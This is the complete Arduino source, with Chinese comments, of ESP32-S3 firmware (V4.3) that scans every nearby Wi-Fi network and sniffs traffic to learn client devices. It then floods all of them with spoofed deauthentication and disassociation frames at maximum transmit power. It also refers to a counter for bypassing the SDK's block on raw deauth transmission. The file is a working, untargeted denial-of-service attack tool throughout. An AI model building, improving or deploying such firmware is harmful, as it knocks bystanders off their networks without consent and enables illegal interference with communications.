/* ============================================================
 * ESP32-S3 自动断网固件  V4.3  ← 当前版本（CURRENT）
 * 本文件是 2026-11-22 烧进 MAC 8c:fd:49:96:23:30 的那一版，
 * 源码原名 auto_deauth_v43.ino，此处统一命名为 auto_deauth 便于直接编译。
 * 历史版本在 esp32_rebuild\archive\src\{v3,v4,v41,v42,v43}\。
 * 板: ESP32-S3   核心: esp32:esp32 3.3.12   串口: COM6
 *
 * 版本演进（每一步都由 COM6 实机日志驱动，不是猜的）:
 *  V3   原始版：seq 恒定 + 每信道 10ms，穿透率低；客户端表污染。
 *  V4   修 seq/驻留/老化/按信道分桶 -> 实机跑通，bypass 计数正常增长。
 *  V4.1 严格只学 AP->STA 帧 -> 客户端数掉到 0（过滤过头）。
 *  V4.2 双向学习数据帧，仍只有 0~1 个（环境里下行帧太稀）。
 *  V4.3 补上管理帧：assoc/auth/deauth/probe resp/action 里凡地址能对上
 *       已知 BSSID 的，都用来学客户端；同时把 TX 重试加到 3 次。
 *
 * 学习规则（rxCb）:
 *   数据帧 FromDS=1 ToDS=0 -> 客户端=addr1，AP=addr2
 *   数据帧 ToDS=1 FromDS=0 -> 客户端=addr2，AP=addr1
 *   管理帧                  -> 哪一头是已知 BSSID 就把另一头当客户端
 *   一律要求：客户端单播、客户端不是 BSSID、AP 必须是本轮扫描到的 BSSID
 *
 * 帧布局 26 字节：FC(2) Dur(2) addr1(6) addr2(6) addr3(6) SEQ(2) reason(2)
 * Deauth FC=C0 00，Disassoc FC=A0 00
 * ============================================================ */
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_log.h>

extern "C" volatile long g_bypass_hits;

#define MAX_AP              64
#define MAX_CLIENTS         48
#define CLIENT_TTL_ROUNDS   6
#define SENDS_PER_AP        8
#define SEND_GAP_MS         4
#define HAMMER_MS_PER_CH    140
#define CH_FIRST            1
#define CH_LAST             13
#define RETRY_DELAY_US      1500
#define TX_RETRIES          3

static uint8_t  clients[MAX_CLIENTS][6];
static uint8_t  client_ap[MAX_CLIENTS][6];
static uint32_t client_seen[MAX_CLIENTS];
static volatile int      client_cnt = 0;
static volatile uint32_t g_round = 0;
static volatile uint32_t rx_frames = 0;
static volatile uint32_t learn_ok = 0;

static uint8_t  g_ap_bssid[MAX_AP][6];
static volatile int g_ap_cnt = 0;

static uint16_t g_seq = 0;

static bool isKnownAp(const uint8_t* m) {
  int n = g_ap_cnt;
  for (int i = 0; i < n; i++)
    if (memcmp(g_ap_bssid[i], m, 6) == 0) return true;
  return false;
}

static void IRAM_ATTR rxCb(void* data, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  rx_frames++;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)data;
  const uint8_t* f = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;

  const uint8_t* cl;      // 客户端
  const uint8_t* ap;      // AP
  uint8_t fc1 = f[1];
  bool tods   = (fc1 & 0x01) != 0;
  bool fromds = (fc1 & 0x02) != 0;
  bool mgmt   = (f[0] & 0x0C) == 0x00;   // type=0 管理帧
  if (fromds && !tods) {                 // AP -> STA 数据帧：a1=STA, a2=BSSID
    cl = f + 4;  ap = f + 10;
  } else if (tods && !fromds) {          // STA -> AP 数据帧：a2=STA, a1=BSSID
    cl = f + 10; ap = f + 4;
  } else if (mgmt) {                     // 管理帧：用"地址对上已知 AP"判方向
    const uint8_t* a1 = f + 4;
    const uint8_t* a2 = f + 10;
    if (isKnownAp(a1) && !(a2[0] & 0x01) && !isKnownAp(a2)) {
      cl = a2; ap = a1;                  // assoc/auth/deauth/probe req 发往 AP
    } else if (isKnownAp(a2) && !(a1[0] & 0x01) && !isKnownAp(a1)) {
      cl = a1; ap = a2;                  // assoc resp/probe resp/action 来自 AP
    } else {
      return;                            // beacon、广播探测等，学不到有效 STA
    }
  } else {
    return;                              // IBSS/控制帧，跳过
  }
  if (cl[0] & 0x01) return;              // 广播/组播不是单个客户端
  if (isKnownAp(cl)) return;             // 客户端不能是 AP 自己

  int n = client_cnt;
  for (int i = 0; i < n; i++) {
    if (memcmp(clients[i], cl, 6) == 0) {
      client_seen[i] = g_round;
      memcpy(client_ap[i], ap, 6);       // 漫游后更新所属 AP
      return;
    }
  }
  if (n < MAX_CLIENTS) {
    memcpy(clients[n], cl, 6);
    memcpy(client_ap[n], ap, 6);
    client_seen[n] = g_round;
    client_cnt = n + 1;
    learn_ok++;
  }
}

static void buildFrame(uint8_t* fr, uint8_t fc0, const uint8_t* bssid,
                       const uint8_t* dst, uint16_t reason) {
  fr[0] = fc0; fr[1] = 0x00;               // C0 00 deauth / A0 00 disassoc
  fr[2] = 0x00; fr[3] = 0x00;
  memcpy(fr + 4,  dst, 6);                 // addr1 = 目的
  memcpy(fr + 10, bssid, 6);               // addr2 = BSSID
  memcpy(fr + 16, bssid, 6);               // addr3 = 源
  g_seq = (g_seq + 1) & 0x0FFF;
  fr[22] = (uint8_t)((g_seq & 0x000F) << 4);
  fr[23] = (uint8_t)((g_seq >> 4) & 0xFF);
  fr[24] = (uint8_t)(reason & 0xFF);
  fr[25] = (uint8_t)(reason >> 8);
}

static inline bool sendFrame(const uint8_t* fr) {
  for (int t = 0; t < TX_RETRIES; t++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, fr, 26, false) == ESP_OK) return true;
    delayMicroseconds(RETRY_DELAY_US);     // TX 缓冲满(257)时退避重试
  }
  return false;
}

static int burstChannel(int ch, const uint8_t (*bssids)[6], int n,
                        uint32_t& errs) {
  int sent = 0;
  uint8_t fr[26];
  const uint8_t bc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  delay(3);
  for (int i = 0; i < n; i++) {
    for (int k = 0; k < SENDS_PER_AP; k++) {
      uint8_t fc = (k % 2) ? 0xA0 : 0xC0;
      uint16_t rs = (k % 4 < 2) ? 2 : 7;
      buildFrame(fr, fc, bssids[i], bc, rs);
      if (sendFrame(fr)) sent++; else errs++;
      int cc = client_cnt;
      for (int c = 0; c < cc; c++) {
        if (memcmp(client_ap[c], bssids[i], 6) != 0) continue;
        buildFrame(fr, fc, bssids[i], clients[c], rs);
        if (sendFrame(fr)) sent++; else errs++;
      }
      delay(SEND_GAP_MS);
    }
  }
  return sent;
}

void setup() {
  Serial.begin(115200);
  delay(400);
  esp_log_level_set("*", ESP_LOG_NONE);     // 静音 wifi 库 E/W 刷屏
  Serial.println("\n=== 自动断网 V4.3 ===");
  wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();
  Serial.printf("esp_wifi_init: %d\n", esp_wifi_init(&config));
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  Serial.printf("set_mode STA: %d\n", esp_wifi_set_mode(WIFI_MODE_STA));
  Serial.printf("rx_cb: %d\n", esp_wifi_set_promiscuous_rx_cb(rxCb));
  Serial.printf("promiscuous: %d\n", esp_wifi_set_promiscuous(true));
  Serial.printf("start: %d\n", esp_wifi_start());
  Serial.printf("event_mask: %d\n", esp_wifi_set_event_mask(0xFFFFFFFF));
  Serial.printf("max_tx_power: %d\n", esp_wifi_set_max_tx_power(82));
  int8_t cur = 0;
  esp_wifi_get_max_tx_power(&cur);
  Serial.printf("TX 功率: %d (%.2f dBm)\n", cur, cur * 0.25f);
}

void loop() {
  g_round++;
  static wifi_ap_record_t aps[MAX_AP];

  // ---- 1. 扫描（先关 promiscuous，避免抢射频/0 AP） ----
  esp_wifi_set_promiscuous(false);
  esp_wifi_clear_ap_list();
  wifi_scan_config_t cfg = {};
  cfg.show_hidden = true;
  cfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
  cfg.scan_time.active.min = 30;
  cfg.scan_time.active.max = 90;
  cfg.channel_bitmap.ghz_2_channels = 0x3FFE;   // ch1..13
  esp_err_t se = esp_wifi_scan_start(&cfg, true);
  uint16_t apNum = 0;
  if (se == ESP_OK) {
    esp_wifi_scan_get_ap_num(&apNum);
    if (apNum > MAX_AP) apNum = MAX_AP;
    if (apNum > 0) esp_wifi_scan_get_ap_records(&apNum, aps);
  } else {
    Serial.printf("scan_start 失败: %d\n", se);
    esp_wifi_set_promiscuous(true);
    delay(600);
    return;
  }
  esp_wifi_set_promiscuous(true);

  int ac = apNum < MAX_AP ? apNum : MAX_AP;
  for (int i = 0; i < ac; i++) memcpy(g_ap_bssid[i], aps[i].bssid, 6);
  g_ap_cnt = ac;

  // ---- 2. 客户端老化 ----
  int n = client_cnt;
  for (int i = 0; i < n; ) {
    if (g_round - client_seen[i] > CLIENT_TTL_ROUNDS) {
      memcpy(clients[i], clients[n-1], 6);
      memcpy(client_ap[i], client_ap[n-1], 6);
      client_seen[i] = client_seen[n-1];
      n--;
      client_cnt = n;
    } else i++;
  }

  Serial.printf("--- 第%lu轮: %d AP / %d CLIENT ---\n",
                (unsigned long)g_round, apNum, n);
  for (int i = 0; i < apNum && i < 10; i++)
    Serial.printf("  %-24s ch%2d rssi%4d %02x:%02x:%02x:%02x:%02x:%02x\n",
        (const char*)aps[i].ssid, aps[i].primary, aps[i].rssi,
        aps[i].bssid[0], aps[i].bssid[1], aps[i].bssid[2],
        aps[i].bssid[3], aps[i].bssid[4], aps[i].bssid[5]);

  // ---- 3. 按信道分组打 ----
  uint32_t errs = 0, sent = 0, hammered = 0;
  const uint8_t bc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
    uint8_t list[MAX_AP][6];
    int cnt = 0;
    for (int i = 0; i < apNum; i++)
      if (aps[i].primary == ch) { memcpy(list[cnt++], aps[i].bssid, 6); }
    if (!cnt) continue;

    sent += burstChannel(ch, (const uint8_t (*)[6])list, cnt, errs);

    // 信道已在 burstChannel 里切好，不再重复 set_channel（少一半事件）
    uint32_t t0 = millis();
    while (millis() - t0 < HAMMER_MS_PER_CH) {
      for (int i = 0; i < cnt; i++) {
        uint8_t fr[26];
        uint8_t fc = (hammered % 2) ? 0xA0 : 0xC0;
        uint16_t rs = (hammered % 2) ? 7 : 2;
        buildFrame(fr, fc, list[i], bc, rs);
        if (sendFrame(fr)) sent++; else errs++;
        hammered++;
        int cc = client_cnt;
        for (int c = 0; c < cc; c++) {
          if (memcmp(client_ap[c], list[i], 6) != 0) continue;
          buildFrame(fr, 0xC0, list[i], clients[c], 2);
          if (sendFrame(fr)) sent++; else errs++;
        }
        delay(SEND_GAP_MS);
      }
    }
  }

  Serial.printf("第%lu轮结束: 发射%d 失败%u 客户端%d(累计学%d) 收帧%lu bypass=%ld\n",
      (unsigned long)g_round, sent, errs, n, (unsigned)learn_ok,
      (unsigned long)rx_frames, g_bypass_hits);
  esp_wifi_clear_ap_list();
}
